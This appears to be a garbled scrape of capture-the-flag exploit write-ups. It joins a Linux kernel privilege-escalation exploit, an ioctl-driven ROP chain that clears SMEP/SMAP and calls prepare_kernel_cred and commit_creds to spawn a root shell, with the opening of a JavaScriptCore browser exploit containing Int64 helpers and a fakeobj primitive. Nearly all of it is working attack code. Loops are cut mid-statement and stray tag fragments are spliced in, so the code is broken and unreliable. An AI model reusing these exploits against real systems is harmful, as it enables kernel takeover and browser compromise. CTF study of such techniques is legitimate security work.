    print_hex(alloc->buf);
    ((u64*)alloc->buf)[3] = buf_addr;  //  
    ((u64*)alloc->buf)[4] = buf_addr;
    a = ioctl(f,EDIT,alloc);
    for(i=0;iindex = 3;
    alloc->pos = 0 - 568;
    alloc->size =  568 + 1;
    ioctl(f,READ,alloc);  
    print_hex(alloc->buf);
    alloc->index = 3;
    alloc->pos = 0 - 568;
    alloc->size =  568 + 1;
    ((u64*)alloc->buf)[0] = kernel_base + 1561198;//buf_addr + 0xc00;
    a = ioctl(f,EDIT,alloc);
    alloc->pos = 0 - 40;
    alloc->size =  40 + 0x2a0;
    int flag = 0;
        save_state();
    ((u64*)alloc->buf)[flag++] = kernel_base + 0xE546; //ret
    ((u64*)alloc->buf)[flag++] = kernel_base + 0xE546; // ret 
    ((u64*)alloc->buf)[flag++] = kernel_base + 0x1B5A1; // pop rax ;ret
    ((u64*)alloc->buf)[flag++] = 0x6f0;
    ((u64*)alloc->buf)[flag++] = kernel_base + 0x1B7A0; //cr4smep smap
    /*
seg000:000000000001B7A0                 mov     cr4, rax
seg000:000000000001B7A3                 push    rcx
seg000:000000000001B7A4                 popfq
ï¬‚agdouble fetch
OOB
Status: Completed Tags: Pwn
seg000:000000000001B7A5                 pop     rbp
seg000:000000000001B7A6                 retn    
    */
    ((u64*)alloc->buf)[flag++] = alloc->buf + 0x10000;
    ((u64*)alloc->buf)[flag++] = kernel_base + 0x10D21C; // pop rdi; pop rax; ret  rdi 0
    ((u64*)alloc->buf)[flag++] = 0;
    ((u64*)alloc->buf)[flag++] = 316368 + kernel_base; // prepare_kernel_cred
    ((u64*)alloc->buf)[flag++] = kernel_base + 0x13B204 ; 
        /*
    seg000:000000000013B204                 pop     rcx
seg000:000000000013B205                 pop     rbx
seg000:000000000013B206                 pop     r12
seg000:000000000013B208                 pop     r13
seg000:000000000013B20A                 pop     r14
seg000:000000000013B20C                 pop     rbp
seg000:000000000013B20D                 retn*/
    ((u64*)alloc->buf)[flag++] = 0x13B20C + kernel_base;
    ((u64*)alloc->buf)[flag++] = 0;
    ((u64*)alloc->buf)[flag++] = 0;
    ((u64*)alloc->buf)[flag++] = 0;
    ((u64*)alloc->buf)[flag++] = 0;
    ((u64*)alloc->buf)[flag++] = alloc->buf + 0x10000; //
    ((u64*)alloc->buf)[flag++] = kernel_base + 663415 ; // 0xffffffff810a1f77 : mov rdi, rax ; call rcx
    // prepare_kernel_cred(0)rdi
    ((u64*)alloc->buf)[flag++] = 315936 + kernel_base; //commit_creds
    ((u64*)alloc->buf)[flag++] = 2100270 + kernel_base; //swapgs ; popfq ; pop rbp ; ret
    ((u64*)alloc->buf)[flag++] = 0x246;
    ((u64*)alloc->buf)[flag++] = 0;
    ((u64*)alloc->buf)[flag++] = 0x19356 + kernel_base ; // iretq
    ((u64*)alloc->buf)[flag++] = (size_t)&shell;
    ((u64*)alloc->buf)[flag++] = user_cs;                /* saved CS */
    ((u64*)alloc->buf)[flag++] = user_rflags;            /* saved EFLAGS */
    ((u64*)alloc->buf)[flag++] = &f - (u64)0x100;  /* stack */
    ((u64*)alloc->buf)[flag++] = user_ss;
    a = ioctl(f,EDIT,alloc);
    printf("%d\n",a);
    printf("123\n");
    for(int i=0;i
    Welcome my little pwnie 1,2,3!
    //
    // Utility functions.
    //
    // Return the hexadecimal representation of the given byte.
    function hex(b) {
        return ('0' + b.toString(16)).substr(-2);
    }
    // Return the hexadecimal representation of the given byte array.
    function hexlify(bytes) {
        var res = [];
        for (var i = 0; i  8)
                parts.splice(8, 0, ' ');
            lines.push(parts.join(' '));
        }
        return lines.join('\n');
    }
    // Simplified version of the similarly named python module.
    var Struct = (function() {
        // Allocate these once to avoid unecessary heap allocations during pack/unpack operations.
        var buffer      = new ArrayBuffer(8);
        var byteView    = new Uint8Array(buffer);
        var uint32View  = new Uint32Array(buffer);
        var float64View = new Float64Array(buffer);
        return {
            pack: function(type, value) {
                var view = type;        // See below
                view[0] = value;
                return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
            },
            unpack: function(type, bytes) {
                if (bytes.length !== type.BYTES_PER_ELEMENT)
                    throw Error("Invalid bytearray");
                var view = type;        // See below
                byteView.set(bytes);
                return view[0];
            },
            // Available types.
            int8:    byteView,
            int32:   uint32View,
            float64: float64View
        };
    })();
    //
    // Tiny module that provides big (64bit) integers.
    //
    // Datatype to represent 64-bit integers.
    //
    // Internally, the integer is stored as a Uint8Array in little endian byte order.
    function Int64(v) {
        // The underlying byte array.
        var bytes = new Uint8Array(8);
        switch (typeof v) {
            case 'number':
                v = '0x' + Math.floor(v).toString(16);
            case 'string':
                if (v.startsWith('0x'))
                    v = v.substr(2);
                if (v.length % 2 == 1)
                    v = '0' + v;
                var bigEndian = unhexlify(v, 8);
                bytes.set(Array.from(bigEndian).reverse());
                break;
            case 'object':
                if (v instanceof Int64) {
                    bytes.set(v.bytes());
                } else {
                    if (v.length != 8)
                        throw TypeError("Array must have excactly 8 elements.");
                    bytes.set(v);
                }
                break;
            case 'undefined':
                break;
            default:
                throw TypeError("Int64 constructor requires an argument.");
        }
        // Return a double whith the same underlying bit representation.
        this.asDouble = function() {
            // Check for NaN
            if (bytes[7] == 0xff && (bytes[6] == 0xff || bytes[6] == 0xfe))
                throw new RangeError("Integer can not be represented by a double");
            return Struct.unpack(Struct.float64, bytes);
        };
        // Return a javascript value with the same underlying bit representation.
        // This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)
        // due to double conversion constraints.
        this.asJSValue = function() {
            if ((bytes[7] == 0 && bytes[6] == 0) || (bytes[7] == 0xff && bytes[6] == 0xff))
                throw new RangeError("Integer can not be represented by a JSValue");
            // For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.
            this.assignSub(this, 0x1000000000000);
            var res = Struct.unpack(Struct.float64, bytes);
            this.assignAdd(this, 0x1000000000000);
            return res;
        };
        // Return the underlying bytes of this number as array.
        this.bytes = function() {
            return Array.from(bytes);
        };
        // Return the byte at the given index.
        this.byteAt = function(i) {
            return bytes[i];
        };
        // Return the value of this number as unsigned hex string.
        this.toString = function() {
            return '0x' + hexlify(Array.from(bytes).reverse());
        };
        // Basic arithmetic.
        // These functions assign the result of the computation to their 'this' object.
        // Decorator for Int64 instance operations. Takes care
        // of converting arguments to Int64 instances if required.
        function operation(f, nargs) {
            return function() {
                if (arguments.length != nargs)
                    throw Error("Not enough arguments for function " + f.name);
                for (var i = 0; i  0xff | 0;
                bytes[i] = cur;
            }
            return this;
        }, 2);
        // this = a - b
        this.assignSub = operation(function sub(a, b) {
            var carry = 0;
            for (var i = 0; i 
    // primitives, addr's type = double
    function fakeobj(addr) {
      var a = [1, 2, []];
      for(var i = 4; i < 11; i++) {
        a.push(i);
      }
      a.length = 5;
      var o = {
        valueOf: function() {
          a.length = 10;